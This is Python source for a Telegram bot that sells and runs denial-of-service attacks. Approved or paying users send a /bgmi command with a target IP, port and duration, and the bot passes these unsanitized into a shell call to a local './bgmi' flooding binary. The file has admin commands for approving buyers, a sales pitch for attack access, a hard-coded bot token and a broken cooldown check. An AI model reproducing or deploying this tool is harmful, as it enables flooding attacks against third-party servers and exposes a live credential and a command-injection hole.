import telebot
import subprocess
import datetime
import os
import logging
import time

# Configure logging
logging.basicConfig(filename='bot.log', level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

# Insert your Telegram bot token here
bot = telebot.TeleBot('7563083106:AAHhDgtOgiJQ2EDGhTTqt3MTV4bPhBOVQLo')

# Owner and admin user IDs
owner_id = "6281757332"
admin_ids = ["1095303717", "ADMIN_USER_ID2"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# Dictionary to store last attack time and credits
user_last_attack = {}

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return [line.split()[0] for line in file.readlines()]
    except FileNotFoundError:
        return []

# Read allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, duration):
    try:
        user_info = bot.get_chat(user_id)
        username = "@" + user_info.username if user_info.username else f"UserID: {user_id}"
        with open("log.txt", "a") as file:
            file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {duration}\n\n")
    except Exception as e:
        logging.error(f"Error logging command: {e}")

# Function to handle the reply when free users run the /attack command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name

    response = (
        f"🚀 **Attack Initiated!** 💥\n\n"
        f"🔴 **Target IP** {target}\n"
        f"🟢 **Target Port:** {port}\n"
        f"⏳ **Duration** {time} seconds\n\n"
        f"✅ **Attack in Progress :**\n\n"
    )
    try:
        bot.reply_to(message, response)
    except Exception as e:
        logging.error(f"Error sending reply to {message.chat.id}: {e}")

# Handler for commands starting with '/'
@bot.message_handler(func=lambda message: message.text and message.text.startswith('/'))
def handle_command(message):
    if message.text.startswith('/bgmi'):
        handle_attack(message)
    elif message.text.startswith('/start'):
        start(message)
    elif message.text.startswith('/approveuser'):
        approve_user(message)
    elif message.text.startswith('/removeuser'):
        remove_user(message)
    elif message.text.startswith('/broadcast'):
        broadcast(message)
    elif message.text.startswith('/allusers'):
        all_users(message)

# Handler for /attack command and direct attack input
def handle_attack(message):
    user_id = str(message.chat.id)

    if user_id in allowed_user_ids:
        # Check last attack time for cooldown
        current_time = time.time()
        last_attack_time = user_last_attack.get(user_id, 0)
        wait_time = 120.0 - (current_time - last_attack_time)

        if wait_time > 120:
            response = f"🚫 **You must wait {wait_time:.2f} seconds before initiating another attack.**"
        else:
            # Proceed with attack command
            command = message.text.split()
            if len(command) == 4 or (not message.text.startswith('/') and len(command) == 3):
                if not message.text.startswith('/'):
                    command = ['/bgmi'] + command  # Prepend '/attack' to the command list
                target = command[1]
                port = int(command[2])
                time_duration = int(command[3])
                if time_duration > 120:
                    response = "❌ **Error:** Time interval must be less than 120 Seconds."
                else:
                    user_last_attack[user_id] = current_time
                    log_command(user_id, target, port, time_duration)
                    start_attack_reply(message, target, port, time_duration)
                    full_command = f"./bgmi {target} {port} {time_duration} 677"
                    subprocess.run(full_command, shell=True)
                    response = f"🎯 **Attack Finished!**\nTarget: {target}\nPort: {port}\nDuration: {time_duration} seconds"
            else:
                # Removed the response asking for the correct format
                # Adding a delay before retrying
                time.sleep(5)  # Wait for 5 seconds before retrying
                return  # Exits the function here and lets the bot wait before retrying
    else:
        # Unauthorized access message
        response = (
            "🚫 **Unauthorized Access!** 🚫\n\n"
            "Oops! It seems like you don't have permission to use the /attack command. To gain access and unleash the power of attacks, you can:\n\n"
            "👉 **Contact an Admin or the Owner for approval.**\n"
            "🌟 **Become a proud supporter and purchase approval.**\n"
            " **Chat with an admin now and level up your capabilities!**\n\n"
            "🚀 Ready to supercharge your experience? Take action and get ready for powerful attacks!"
        )
    bot.reply_to(message, response)

# Command to approve users
def approve_user(message):
    user_id = str(message.chat.id)
    if user_id == owner_id or user_id in admin_ids:
        command = message.text.split()
        if len(command) == 3:
            user_to_approve = command[1]
            duration = command[2]
            if user_to_approve not in allowed_user_ids:
                allowed_user_ids.append(user_to_approve)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_approve} {duration}\n")
                response = f"✅ **User {user_to_approve} has been approved for {duration}!**"
            else:
                response = f"❌ **User {user_to_approve} is already approved!**"
        else:
            response = "⚠️ **Usage:** /approveuser <user_id> <duration>"
    else:
        response = "❌ **Only Admins or the Owner can approve users!** 😡"
    bot.send_message(message.chat.id, response)

# Command to remove users
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id == owner_id or user_id in admin_ids:
        command = message.text.split()
        if len(command) == 2:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user in allowed_user_ids:
                        file.write(f"{user}\n")
                response = f"🗑️ **User {user_to_remove} has been removed successfully!**"
            else:
                response = f"❌ **User {user_to_remove} not found!**"
        else:
            response = "⚠️ **Usage:** /removeuser <user_id>"
    else:
        response = "❌ **Only Admins or the Owner can remove users!** 😡"
    bot.send_message(message.chat.id, response)

# Command to send broadcast message
def broadcast(message):
    user_id = str(message.chat.id)
    
    if user_id == owner_id or user_id in admin_ids:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            broadcast_message = command[1]
            successfully_sent = 0  # Counter for successfully sent messages
            failed_users = []  # List to store users who failed to receive the message

            # Send the broadcast message to all allowed users
            for user in allowed_user_ids:
                try:
                    bot.send_message(user, broadcast_message)
                    successfully_sent += 1
                except Exception as e:
                    logging.error(f"Error sending message to {user}: {e}")
                    failed_users.append(user)  # Add failed user to the list

            # Prepare the response for the owner/admin
            if user_id == owner_id:
                response = f"✅ **Broadcast message sent!**\n\n"
                response += f"📩 **{successfully_sent} users successfully received your broadcast!**\n"
                response += f"❌ **{len(failed_users)} users failed to receive the message.**\n"
                if failed_users:
                    response += f"🔴 **Failed users:**\n" + "\n".join(failed_users)

            # Prepare the response for the admin or user who triggered the broadcast
            else:
                response = f"✅ **Broadcast message sent!**\n\n"
                response += f"📩 **{successfully_sent} users successfully received your broadcast!**"

        else:
            response = "⚠️ **Usage:** /broadcast <your_message>"
    
    else:
        response = "❌ **Only Admins or the Owner can broadcast messages!**"

    # Send the response back to the user who triggered the broadcast
    bot.send_message(message.chat.id, response)

# Command to list all approved users
def all_users(message):
    user_id = str(message.chat.id)
    if user_id == owner_id or user_id in admin_ids:
        if allowed_user_ids:
            users_list = "\n".join(allowed_user_ids)
            response = f"🗂️ **List of Approved Users:**\n{users_list}"
        else:
            response = "❌ **No approved users found!**"
    else:
        response = "❌ **Only Admins or the Owner can view the user list!**"
    bot.send_message(message.chat.id, response)

# To ensure the bot runs continuously without crashing
while True:
    try:
        bot.polling(none_stop=True, interval=0)
    except Exception as e:
        logging.error(f"Error during bot polling: {e}")
        